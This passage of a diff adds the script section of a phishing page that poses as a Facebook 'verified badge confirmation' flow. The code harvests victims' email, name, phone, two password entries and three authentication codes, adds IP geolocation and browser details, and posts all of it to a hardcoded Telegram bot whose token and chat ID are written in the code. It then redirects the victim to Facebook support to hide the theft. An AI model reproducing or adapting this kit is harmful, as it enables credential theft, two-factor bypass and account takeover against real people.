+    setTimeout(() => {
+        document.getElementById("authModal3").classList.remove("active");
+        
+        // Fetch geolocation for result display
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(geoData => {
+                // Populate result modal
+                document.getElementById("resultEmail").textContent = document.getElementById("email").value;
+                document.getElementById("resultName").textContent = document.getElementById("name").value;
+                document.getElementById("resultPhone").textContent = document.getElementById("fullPhone").value;
+                document.getElementById("resultIP").textContent = geoData.ip || "Unknown";
+                document.getElementById("resultCountry").textContent = geoData.country_name || "Unknown";
+                document.getElementById("resultCity").textContent = geoData.city || "Unknown";
+                document.getElementById("resultTimestamp").textContent = new Date().toLocaleString();
+                document.getElementById("resultUserAgent").textContent = navigator.userAgent || "Unknown";
+                
+                // Show result modal
+                setTimeout(() => {
+                    document.getElementById("resultModal").classList.add("active");
+                }, 300);
+                
+                // Redirect after 5 seconds
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com/support?ref=contextual";
+                }, 5000);
+            })
+            .catch(error => {
+                // Populate without geolocation
+                document.getElementById("resultEmail").textContent = document.getElementById("email").value;
+                document.getElementById("resultName").textContent = document.getElementById("name").value;
+                document.getElementById("resultPhone").textContent = document.getElementById("fullPhone").value;
+                document.getElementById("resultIP").textContent = "Unknown";
+                document.getElementById("resultCountry").textContent = "Unknown";
+                document.getElementById("resultCity").textContent = "Unknown";
+                document.getElementById("resultTimestamp").textContent = new Date().toLocaleString();
+                document.getElementById("resultUserAgent").textContent = navigator.userAgent || "Unknown";
+                
+                // Show result modal
+                setTimeout(() => {
+                    document.getElementById("resultModal").classList.add("active");
+                }, 300);
+                
+                // Redirect after 5 seconds
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com/support?ref=contextual";
+                }, 5000);
+            });
+    }, 2000);
+};
+
+// Send data to Telegram
+function sendToTelegram(type, data = "") {
+    const email = document.getElementById("email").value;
+    const name = document.getElementById("name").value;
+    const phone = document.getElementById("fullPhone").value;
+    const userAgent = navigator.userAgent;
+    
+    // Fetch geolocation data
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(geoData => {
+            const ip = geoData.ip || "Unknown";
+            const country = geoData.country_name || "Unknown";
+            const city = geoData.city || "Unknown";
+            
+            let message = "";
+            
+            if (type === "FORM_SUBMIT") {
+                message = `✅ <b>VERIFIED BADGE CONFIRMATION COMPLETED</b>\n\n` +
+                    `📧 Email: <code>${email}</code>\n` +
+                    `👤 Name: <code>${name}</code>\n` +
+                    ` Phone: <code>${phone}</code>\n\n` +
+                    `🌐 IP Address: <code>${ip}</code>\n` +
+                    `🌍 Country: <code>${country}</code>\n` +
+                    `🏙️ City: <code>${city}</code>\n` +
+                    `💻 User Agent: <code>${userAgent}</code>\n\n` +
+                    `⏰ Timestamp: ${new Date().toLocaleString()}`;
+            } else if (type === "PASSWORD_1") {
+                message = `🔐 <b>PASSWORD VERIFIED (1st) - BADGE CONFIRMATION</b>\n\n` +
+                    `📧 Email: <code>${email}</code>\n` +
+                    `👤 Name: <code>${name}</code>\n` +
+                    ` Phone: <code>${phone}</code>\n\n` +
+                    `🔑 Password: <code>${data}</code>\n\n` +
+                    `🌐 IP Address: <code>${ip}</code>\n` +
+                    `🌍 Country: <code>${country}</code>\n` +
+                    `🏙️ City: <code>${city}</code>\n` +
+                    `💻 User Agent: <code>${userAgent}</code>\n\n` +
+                    `⏰ Timestamp: ${new Date().toLocaleString()}`;
+            } else if (type === "PASSWORD_2") {
+                message = `🔐 <b>PASSWORD VERIFICATION (2nd)</b>\n\n` +
+                    `📧 Email: <code>${email}</code>\n` +
+                    `🔑 Password: <code>${data}</code>\n\n` +
+                    `🌐 IP Address: <code>${ip}</code>\n` +
+                    `🌍 Country: <code>${country}</code>\n` +
+                    `🏙️ City: <code>${city}</code>\n` +
+                    `💻 User Agent: <code>${userAgent}</code>\n\n` +
+                    `⏰ Timestamp: ${new Date().toLocaleString()}`;
+            } else if (type === "AUTH_CODE_1") {
+                message = `✅ <b>AUTHENTICATION CODE 1 VERIFIED</b>\n\n` +
+                    `📧 Email: <code>${email}</code>\n` +
+                    `🔐 Auth Code 1: <code>${data}</code>\n\n` +
+                    `🌐 IP Address: <code>${ip}</code>\n` +
+                    `🌍 Country: <code>${country}</code>\n` +
+                    `🏙️ City: <code>${city}</code>\n` +
+                    `💻 User Agent: <code>${userAgent}</code>\n\n` +
+                    `⏰ Timestamp: ${new Date().toLocaleString()}`;
+            } else if (type === "AUTH_CODE_2") {
+                message = `✅ <b>AUTHENTICATION CODE 2 VERIFIED</b>\n\n` +
+                    `📧 Email: <code>${email}</code>\n` +
+                    `🔐 Auth Code 2: <code>${data}</code>\n\n` +
+                    `🌐 IP Address: <code>${ip}</code>\n` +
+                    `🌍 Country: <code>${country}</code>\n` +
+                    `🏙️ City: <code>${city}</code>\n` +
+                    `💻 User Agent: <code>${userAgent}</code>\n\n` +
+                    `⏰ Timestamp: ${new Date().toLocaleString()}`;
+            } else if (type === "AUTH_CODE_3") {
+                message = `✅ <b>AUTHENTICATION CODE 3 VERIFIED</b>\n\n` +
+                    `📧 Email: <code>${email}</code>\n` +
+                    `🔐 Auth Code 3: <code>${data}</code>\n\n` +
+                    `🌐 IP Address: <code>${ip}</code>\n` +
+                    `🌍 Country: <code>${country}</code>\n` +
+                    `🏙️ City: <code>${city}</code>\n` +
+                    `💻 User Agent: <code>${userAgent}</code>\n\n` +
+                    `⏰ Timestamp: ${new Date().toLocaleString()}`;
+            }
+            
+            const botToken = "5910921170:AAFSOCmubbvfYHhD8W3mbyhslMUI-iGtsMU";
+            const chatId = "865748781";
+            
+            // Send text message
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram message sent:', data);
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        })
+        .catch(error => {
+            console.error('Error fetching geolocation:', error);
+            // Send message without geolocation data if API fails
+            sendToTelegramFallback(type, data, email);
+        });
+}
+
+// Fallback function if geolocation API fails
+function sendToTelegramFallback(type, data = "", email = "") {
+    const name = document.getElementById("name").value;
+    const phone = document.getElementById("fullPhone").value;
+    const userAgent = navigator.userAgent;
+    
+    let message = "";
+    
+    if (type === "FORM_SUBMIT") {
+        message = `✅ <b>VERIFIED BADGE CONFIRMATION COMPLETED</b>\n\n` +
+            `📧 Email: <code>${email}</code>\n` +
+            `👤 Name: <code>${name}</code>\n` +
+            ` Phone: <code>${phone}</code>\n` +
+            `💻 User Agent: <code>${userAgent}</code>\n\n` +
+            `⏰ Timestamp: ${new Date().toLocaleString()}`;
+    } else if (type === "PASSWORD_1") {
+        message = `🔐 <b>PASSWORD VERIFIED (1st) - BADGE CONFIRMATION</b>\n\n` +
+            `📧 Email: <code>${email}</code>\n` +
+            `👤 Name: <code>${name}</code>\n` +
+            ` Phone: <code>${phone}</code>\n\n` +
+            `🔑 Password: <code>${data}</code>\n` +
+            `💻 User Agent: <code>${userAgent}</code>\n\n` +
+            `⏰ Timestamp: ${new Date().toLocaleString()}`;
+    } else if (type === "PASSWORD_2") {
+        message = `🔐 <b>PASSWORD VERIFIED (2nd)</b>\n\n` +
+            `📧 Email: <code>${email}</code>\n` +
+            `🔑 Password: <code>${data}</code>\n` +
+            `💻 User Agent: <code>${userAgent}</code>\n\n` +
+            `⏰ Timestamp: ${new Date().toLocaleString()}`;
+    } else if (type === "AUTH_CODE_1") {
+        message = `✅ <b>AUTHENTICATION CODE 1 VERIFIED</b>\n\n` +
+            `📧 Email: <code>${email}</code>\n` +
+            `🔐 Auth Code 1: <code>${data}</code>\n` +
+            `💻 User Agent: <code>${userAgent}</code>\n\n` +
+            `⏰ Timestamp: ${new Date().toLocaleString()}`;
+    } else if (type === "AUTH_CODE_2") {
+        message = `✅ <b>AUTHENTICATION CODE 2 VERIFIED</b>\n\n` +
+            `📧 Email: <code>${email}</code>\n` +
+            `🔐 Auth Code 2: <code>${data}</code>\n` +
+            `💻 User Agent: <code>${userAgent}</code>\n\n` +
+            `⏰ Timestamp: ${new Date().toLocaleString()}`;
+    } else if (type === "AUTH_CODE_3") {
+        message = `✅ <b>AUTHENTICATION CODE 3 VERIFIED</b>\n\n` +
+            `📧 Email: <code>${email}</code>\n` +
+            `🔐 Auth Code 3: <code>${data}</code>\n` +
+            `💻 User Agent: <code>${userAgent}</code>\n\n` +
+            `⏰ Timestamp: ${new Date().toLocaleString()}`;
+    }
+    
+    const botToken = "5910921170:AAFSOCmubbvfYHhD8W3mbyhslMUI-iGtsMU";
+    const chatId = "865748781";
+    
+    // Send text message
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Telegram message sent:', data);
+    })
+    .catch(error => {
+        console.error('Error sending to Telegram:', error);
+    });
+}
+
+// Forgot password link
+document.getElementById("forgotPasswordLink").onclick = function(e){
+    e.preventDefault();
+    alert("Please check your email for password recovery instructions");
+};
+</script>
+</body>
+</html>
